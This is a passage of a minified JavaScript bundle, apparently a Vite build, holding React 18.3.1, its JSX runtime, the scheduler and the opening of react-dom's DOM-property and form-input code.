function Zd(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=t(r);fetch(r.href,i)}})();function Jd(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var eu={exports:{}},ci={},nu={exports:{}},U={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Fs=Symbol.for("react.element"),eh=Symbol.for("react.portal"),nh=Symbol.for("react.fragment"),th=Symbol.for("react.strict_mode"),sh=Symbol.for("react.profiler"),rh=Symbol.for("react.provider"),ih=Symbol.for("react.context"),ah=Symbol.for("react.forward_ref"),lh=Symbol.for("react.suspense"),oh=Symbol.for("react.memo"),ch=Symbol.for("react.lazy"),go=Symbol.iterator;function uh(e){return e===null||typeof e!="object"?null:(e=go&&e[go]||e["@@iterator"],typeof e=="function"?e:null)}var tu={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},su=Object.assign,ru={};function Ht(e,n,t){this.props=e,this.context=n,this.refs=ru,this.updater=t||tu}Ht.prototype.isReactComponent={};Ht.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};Ht.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function iu(){}iu.prototype=Ht.prototype;function cl(e,n,t){this.props=e,this.context=n,this.refs=ru,this.updater=t||tu}var ul=cl.prototype=new iu;ul.constructor=cl;su(ul,Ht.prototype);ul.isPureReactComponent=!0;var yo=Array.isArray,au=Object.prototype.hasOwnProperty,pl={current:null},lu={key:!0,ref:!0,__self:!0,__source:!0};function ou(e,n,t){var s,r={},i=null,a=null;if(n!=null)for(s in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(i=""+n.key),n)au.call(n,s)&&!lu.hasOwnProperty(s)&&(r[s]=n[s]);var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){for(var o=Array(l),c=0;c<l;c++)o[c]=arguments[c+2];r.children=o}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)r[s]===void 0&&(r[s]=l[s]);return{$$typeof:Fs,type:e,key:i,ref:a,props:r,_owner:pl.current}}function ph(e,n){return{$$typeof:Fs,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function dl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Fs}function dh(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var vo=/\/+/g;function Ai(e,n){return typeof e=="object"&&e!==null&&e.key!=null?dh(""+e.key):n.toString(36)}function gr(e,n,t,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(i){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case Fs:case eh:a=!0}}if(a)return a=e,r=r(a),e=s===""?"."+Ai(a,0):s,yo(r)?(t="",e!=null&&(t=e.replace(vo,"$&/")+"/"),gr(r,n,t,"",function(c){return c})):r!=null&&(dl(r)&&(r=ph(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(vo,"$&/")+"/")+e)),n.push(r)),1;if(a=0,s=s===""?".":s+":",yo(e))for(var l=0;l<e.length;l++){i=e[l];var o=s+Ai(i,l);a+=gr(i,n,t,o,r)}else if(o=uh(e),typeof o=="function")for(e=o.call(e),l=0;!(i=e.next()).done;)i=i.value,o=s+Ai(i,l++),a+=gr(i,n,t,o,r);else if(i==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function Xs(e,n,t){if(e==null)return e;var s=[],r=0;return gr(e,s,"","",function(i){return n.call(t,i,r++)}),s}function hh(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var be={current:null},yr={transition:null},fh={ReactCurrentDispatcher:be,ReactCurrentBatchConfig:yr,ReactCurrentOwner:pl};function cu(){throw Error("act(...) is not supported in production builds of React.")}U.Children={map:Xs,forEach:function(e,n,t){Xs(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Xs(e,function(){n++}),n},toArray:function(e){return Xs(e,function(n){return n})||[]},only:function(e){if(!dl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};U.Component=Ht;U.Fragment=nh;U.Profiler=sh;U.PureComponent=cl;U.StrictMode=th;U.Suspense=lh;U.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=fh;U.act=cu;U.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=su({},e.props),r=e.key,i=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(i=n.ref,a=pl.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(o in n)au.call(n,o)&&!lu.hasOwnProperty(o)&&(s[o]=n[o]===void 0&&l!==void 0?l[o]:n[o])}var o=arguments.length-2;if(o===1)s.children=t;else if(1<o){l=Array(o);for(var c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}return{$$typeof:Fs,type:e.type,key:r,ref:i,props:s,_owner:a}};U.createContext=function(e){return e={$$typeof:ih,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:rh,_context:e},e.Consumer=e};U.createElement=ou;U.createFactory=function(e){var n=ou.bind(null,e);return n.type=e,n};U.createRef=function(){return{current:null}};U.forwardRef=function(e){return{$$typeof:ah,render:e}};U.isValidElement=dl;U.lazy=function(e){return{$$typeof:ch,_payload:{_status:-1,_result:e},_init:hh}};U.memo=function(e,n){return{$$typeof:oh,type:e,compare:n===void 0?null:n}};U.startTransition=function(e){var n=yr.transition;yr.transition={};try{e()}finally{yr.transition=n}};U.unstable_act=cu;U.useCallback=function(e,n){return be.current.useCallback(e,n)};U.useContext=function(e){return be.current.useContext(e)};U.useDebugValue=function(){};U.useDeferredValue=function(e){return be.current.useDeferredValue(e)};U.useEffect=function(e,n){return be.current.useEffect(e,n)};U.useId=function(){return be.current.useId()};U.useImperativeHandle=function(e,n,t){return be.current.useImperativeHandle(e,n,t)};U.useInsertionEffect=function(e,n){return be.current.useInsertionEffect(e,n)};U.useLayoutEffect=function(e,n){return be.current.useLayoutEffect(e,n)};U.useMemo=function(e,n){return be.current.useMemo(e,n)};U.useReducer=function(e,n,t){return be.current.useReducer(e,n,t)};U.useRef=function(e){return be.current.useRef(e)};U.useState=function(e){return be.current.useState(e)};U.useSyncExternalStore=function(e,n,t){return be.current.useSyncExternalStore(e,n,t)};U.useTransition=function(){return be.current.useTransition()};U.version="18.3.1";nu.exports=U;var C=nu.exports;const uu=Jd(C),mh=Zd({__proto__:null,default:uu},[C]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var gh=C,yh=Symbol.for("react.element"),vh=Symbol.for("react.fragment"),wh=Object.prototype.hasOwnProperty,kh=gh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,bh={key:!0,ref:!0,__self:!0,__source:!0};function pu(e,n,t){var s,r={},i=null,a=null;t!==void 0&&(i=""+t),n.key!==void 0&&(i=""+n.key),n.ref!==void 0&&(a=n.ref);for(s in n)wh.call(n,s)&&!bh.hasOwnProperty(s)&&(r[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)r[s]===void 0&&(r[s]=n[s]);return{$$typeof:yh,type:e,key:i,ref:a,props:r,_owner:kh.current}}ci.Fragment=vh;ci.jsx=pu;ci.jsxs=pu;eu.exports=ci;var g=eu.exports,du={exports:{}},Me={},hu={exports:{}},fu={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(_,N){var R=_.length;_.push(N);e:for(;0<R;){var B=R-1>>>1,F=_[B];if(0<r(F,N))_[B]=N,_[R]=F,R=B;else break e}}function t(_){return _.length===0?null:_[0]}function s(_){if(_.length===0)return null;var N=_[0],R=_.pop();if(R!==N){_[0]=R;e:for(var B=0,F=_.length,te=F>>>1;B<te;){var W=2*(B+1)-1,oe=_[W],se=W+1,ce=_[se];if(0>r(oe,R))se<F&&0>r(ce,oe)?(_[B]=ce,_[se]=R,B=se):(_[B]=oe,_[W]=R,B=W);else if(se<F&&0>r(ce,R))_[B]=ce,_[se]=R,B=se;else break e}}return N}function r(_,N){var R=_.sortIndex-N.sortIndex;return R!==0?R:_.id-N.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var a=Date,l=a.now();e.unstable_now=function(){return a.now()-l}}var o=[],c=[],u=1,d=null,h=3,y=!1,k=!1,x=!1,L=typeof setTimeout=="function"?setTimeout:null,p=typeof clearTimeout=="function"?clearTimeout:null,f=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function m(_){for(var N=t(c);N!==null;){if(N.callback===null)s(c);else if(N.startTime<=_)s(c),N.sortIndex=N.expirationTime,n(o,N);else break;N=t(c)}}function S(_){if(x=!1,m(_),!k)if(t(o)!==null)k=!0,P(T);else{var N=t(c);N!==null&&D(S,N.startTime-_)}}function T(_,N){k=!1,x&&(x=!1,p(E),E=-1),y=!0;var R=h;try{for(m(N),d=t(o);d!==null&&(!(d.expirationTime>N)||_&&!j());){var B=d.callback;if(typeof B=="function"){d.callback=null,h=d.priorityLevel;var F=B(d.expirationTime<=N);N=e.unstable_now(),typeof F=="function"?d.callback=F:d===t(o)&&s(o),m(N)}else s(o);d=t(o)}if(d!==null)var te=!0;else{var W=t(c);W!==null&&D(S,W.startTime-N),te=!1}return te}finally{d=null,h=R,y=!1}}var v=!1,b=null,E=-1,I=5,M=-1;function j(){return!(e.unstable_now()-M<I)}function G(){if(b!==null){var _=e.unstable_now();M=_;var N=!0;try{N=b(!0,_)}finally{N?V():(v=!1,b=null)}}else v=!1}var V;if(typeof f=="function")V=function(){f(G)};else if(typeof MessageChannel<"u"){var w=new MessageChannel,O=w.port2;w.port1.onmessage=G,V=function(){O.postMessage(null)}}else V=function(){L(G,0)};function P(_){b=_,v||(v=!0,V())}function D(_,N){E=L(function(){_(e.unstable_now())},N)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(_){_.callback=null},e.unstable_continueExecution=function(){k||y||(k=!0,P(T))},e.unstable_forceFrameRate=function(_){0>_||125<_?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<_?Math.floor(1e3/_):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return t(o)},e.unstable_next=function(_){switch(h){case 1:case 2:case 3:var N=3;break;default:N=h}var R=h;h=N;try{return _()}finally{h=R}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(_,N){switch(_){case 1:case 2:case 3:case 4:case 5:break;default:_=3}var R=h;h=_;try{return N()}finally{h=R}},e.unstable_scheduleCallback=function(_,N,R){var B=e.unstable_now();switch(typeof R=="object"&&R!==null?(R=R.delay,R=typeof R=="number"&&0<R?B+R:B):R=B,_){case 1:var F=-1;break;case 2:F=250;break;case 5:F=1073741823;break;case 4:F=1e4;break;default:F=5e3}return F=R+F,_={id:u++,callback:N,priorityLevel:_,startTime:R,expirationTime:F,sortIndex:-1},R>B?(_.sortIndex=R,n(c,_),t(o)===null&&_===t(c)&&(x?(p(E),E=-1):x=!0,D(S,R-B))):(_.sortIndex=F,n(o,_),k||y||(k=!0,P(T))),_},e.unstable_shouldYield=j,e.unstable_wrapCallback=function(_){var N=h;return function(){var R=h;h=N;try{return _.apply(this,arguments)}finally{h=R}}}})(fu);hu.exports=fu;var xh=hu.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Sh=C,Re=xh;function A(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var mu=new Set,ys={};function ot(e,n){Ot(e,n),Ot(e+"Capture",n)}function Ot(e,n){for(ys[e]=n,e=0;e<n.length;e++)mu.add(n[e])}var hn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),ia=Object.prototype.hasOwnProperty,_h=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,wo={},ko={};function Eh(e){return ia.call(ko,e)?!0:ia.call(wo,e)?!1:_h.test(e)?ko[e]=!0:(wo[e]=!0,!1)}function Th(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Ch(e,n,t,s){if(n===null||typeof n>"u"||Th(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function xe(e,n,t,s,r,i,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=i,this.removeEmptyString=a}var fe={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){fe[e]=new xe(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];fe[n]=new xe(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){fe[e]=new xe(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){fe[e]=new xe(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){fe[e]=new xe(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){fe[e]=new xe(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){fe[e]=new xe(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){fe[e]=new xe(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){fe[e]=new xe(e,5,!1,e.toLowerCase(),null,!1,!1)});var hl=/[\-:]([a-z])/g;function fl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(hl,fl);fe[n]=new xe(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(hl,fl);fe[n]=new xe(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(hl,fl);fe[n]=new xe(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){fe[e]=new xe(e,1,!1,e.toLowerCase(),null,!1,!1)});fe.xlinkHref=new xe("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){fe[e]=new xe(e,1,!1,e.toLowerCase(),null,!0,!0)});function ml(e,n,t,s){var r=fe.hasOwnProperty(n)?fe[n]:null;(r!==null?r.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Ch(n,t,r,s)&&(t=null),s||r===null?Eh(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,s=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var vn=Sh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ks=Symbol.for("react.element"),dt=Symbol.for("react.portal"),ht=Symbol.for("react.fragment"),gl=Symbol.for("react.strict_mode"),aa=Symbol.for("react.profiler"),gu=Symbol.for("react.provider"),yu=Symbol.for("react.context"),yl=Symbol.for("react.forward_ref"),la=Symbol.for("react.suspense"),oa=Symbol.for("react.suspense_list"),vl=Symbol.for("react.memo"),bn=Symbol.for("react.lazy"),vu=Symbol.for("react.offscreen"),bo=Symbol.iterator;function Gt(e){return e===null||typeof e!="object"?null:(e=bo&&e[bo]||e["@@iterator"],typeof e=="function"?e:null)}var J=Object.assign,Li;function ts(e){if(Li===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Li=n&&n[1]||""}return`
`+Li+e}var Ni=!1;function Ri(e,n){if(!e||Ni)return"";Ni=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var s=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){s=c}e.call(n.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),a=r.length-1,l=i.length-1;1<=a&&0<=l&&r[a]!==i[l];)l--;for(;1<=a&&0<=l;a--,l--)if(r[a]!==i[l]){if(a!==1||l!==1)do if(a--,l--,0>l||r[a]!==i[l]){var o=`
`+r[a].replace(" at new "," at ");return e.displayName&&o.includes("<anonymous>")&&(o=o.replace("<anonymous>",e.displayName)),o}while(1<=a&&0<=l);break}}}finally{Ni=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?ts(e):""}function Ph(e){switch(e.tag){case 5:return ts(e.type);case 16:return ts("Lazy");case 13:return ts("Suspense");case 19:return ts("SuspenseList");case 0:case 2:case 15:return e=Ri(e.type,!1),e;case 11:return e=Ri(e.type.render,!1),e;case 1:return e=Ri(e.type,!0),e;default:return""}}function ca(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case ht:return"Fragment";case dt:return"Portal";case aa:return"Profiler";case gl:return"StrictMode";case la:return"Suspense";case oa:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case yu:return(e.displayName||"Context")+".Consumer";case gu:return(e._context.displayName||"Context")+".Provider";case yl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case vl:return n=e.displayName||null,n!==null?n:ca(e.type)||"Memo";case bn:n=e._payload,e=e._init;try{return ca(e(n))}catch{}}return null}function Ah(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ca(n);case 8:return n===gl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Bn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function wu(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Lh(e){var n=wu(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,i=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){s=""+a,i.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(a){s=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function Qs(e){e._valueTracker||(e._valueTracker=Lh(e))}function ku(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=wu(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function Rr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function ua(e,n){var t=n.checked;return J({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function xo(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Bn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function bu(e,n){n=n.checked,n!=null&&ml(e,"checked",n,!1)}function pa(e,n){bu(e,n);var t=Bn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?da(e,n.type,t):n.hasOwnProperty("defaultValue")&&da(e,n.type,Bn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function So(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function da(e,n,t){(n!=="number"||Rr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var ss=Array.isArray;function Et(e,n,t,s){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Bn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function ha(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(A(91));return J({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function _o(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(A(92));if(ss(t)){if(1<t.length)throw Error(A(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Bn(t)}}function xu(e,n){var t=Bn(n.value),s=Bn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function Eo(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Su(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function fa(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Su(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Zs,_u=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(Zs=Zs||document.createElement("div"),Zs.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=Zs.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function vs(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var os={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Nh=["Webkit","ms","Moz","O"];Object.keys(os).forEach(function(e){Nh.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),os[n]=os[e]})});function Eu(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||os.hasOwnProperty(e)&&os[e]?(""+n).trim():n+"px"}function Tu(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,r=Eu(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,r):e[t]=r}}var Rh=J({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ma(e,n){if(n){if(Rh[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(A(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(A(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw 